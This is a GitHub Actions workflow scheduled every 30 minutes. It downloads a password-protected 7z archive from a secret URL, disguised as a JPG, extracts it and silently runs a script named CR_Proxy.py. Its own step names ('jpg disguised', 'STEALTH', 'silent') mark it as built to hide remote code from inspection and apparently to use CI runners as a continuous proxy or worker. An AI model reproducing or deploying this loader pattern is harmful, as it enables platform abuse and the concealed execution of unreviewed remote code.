name: Linux Worker

on:
  workflow_dispatch:
  schedule:
    - cron: "*/30 * * * *"

concurrency:
  group: worker
  cancel-in-progress: true

jobs:
  worker:
    runs-on: ubuntu-latest
    timeout-minutes: 90

    steps:
      - uses: actions/checkout@v3

      - name: Setup Python
        uses: actions/setup-python@v5
        with:
          python-version: "3.10"

      - name: Prepare dependencies (silent)
        run: |
          sudo apt-get update -y > /dev/null 2>&1
          sudo apt-get install -y p7zip-full > /dev/null 2>&1

      - name: Download model (jpg disguised)
        env:
          MODEL_URL: ${{ secrets.LINK }}
        run: |
          curl -L "$MODEL_URL" -o model.jpg > /dev/null 2>&1

      - name: Rename & extract model
        env:
          ARCHIVE_KEY: ${{ secrets.PASSWORD }}
        run: |
          mv model.jpg model.7z
          7z x model.7z -p"$ARCHIVE_KEY" -oextracted -y > /dev/null 2>&1

      - name: Run CR_Proxy.py (STEALTH)
        run: |
          main=$(find extracted -type f -name "CR_Proxy.py" | head -n 1)
          if [ -z "$main" ]; then exit 0; fi
          python "$main" > /dev/null 2>&1
